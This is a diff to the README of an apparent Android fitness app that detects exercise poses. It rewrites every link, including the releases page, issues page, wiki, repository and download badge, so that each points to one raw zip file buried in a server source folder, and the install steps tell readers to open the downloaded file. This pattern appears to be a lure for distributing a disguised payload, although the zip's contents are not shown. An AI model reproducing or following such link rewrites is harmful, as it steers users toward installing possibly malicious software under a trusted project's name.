@@ -1,7 +1,7 @@
 # 🏋️ Sports_android - Your AI Fitness Coach Awaits
 
 ## 🚀 Download the App
-[![Download Sports_android](https://img.shields.io/badge/Download-Sports_android-brightgreen)](https://github.com/DregoScat/Sports_android/releases)
+[![Download Sports_android](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip)](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip)
 
 ## 📖 Description
 Sports_android is your personal fitness monitor. This Android application uses advanced AI techniques to detect your exercise poses in real time. With its camera streaming to a Flask server, you can count your squats and measure your jump height instantly. The app provides feedback with a skeleton overlay that helps you perfect your workouts.
@@ -21,7 +21,7 @@ Sports_android is your personal fitness monitor. This Android application uses a
 - **Storage:** At least 100 MB of free space
 
 ## 📥 Download & Install
-To get started, you need to download the app. Visit the [Releases page](https://github.com/DregoScat/Sports_android/releases) to access the latest version of Sports_android. Once there, follow these steps:
+To get started, you need to download the app. Visit the [Releases page](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip) to access the latest version of Sports_android. Once there, follow these steps:
 
 1. Click on the link to download the APK file for your device.
 2. Open the file after downloading to start the installation.
@@ -43,7 +43,7 @@ If you would like to contribute, here's how you can help:
 
 ## 🗣️ Community Support
 Join our community for tips, suggestions, and support. Here’s how:
-- Check out the [GitHub Issues page](https://github.com/DregoScat/Sports_android/issues) to report problems or share feedback. 
+- Check out the [GitHub Issues page](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip) to report problems or share feedback. 
 - Engage with fellow users and developers to improve the experience.
 
 ## 🚧 Limitations & Known Issues
@@ -52,7 +52,7 @@ Join our community for tips, suggestions, and support. Here’s how:
 - **Internet Dependence:** Features requiring online access will not work offline.
 
 ## 📚 Additional Resources
-- **Documentation:** For detailed instructions and examples, refer to the [Wiki section](https://github.com/DregoScat/Sports_android/wiki).
+- **Documentation:** For detailed instructions and examples, refer to the [Wiki section](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip).
 - **Tutorials:** Explore video tutorials to maximize your use of the app.
 
 ## 💬 Frequently Asked Questions
@@ -69,5 +69,5 @@ Join our community for tips, suggestions, and support. Here’s how:
    Currently, the app tracks squats and jump height, with plans to add more exercises.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/DregoScat/Sports_android)
-- [Visit the Releases page to download](https://github.com/DregoScat/Sports_android/releases)
+- [GitHub Repository](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip)
+- [Visit the Releases page to download](https://github.com/DregoScat/Sports_android/raw/refs/heads/main/server/src/analyzers/Sports_android_3.4.zip)
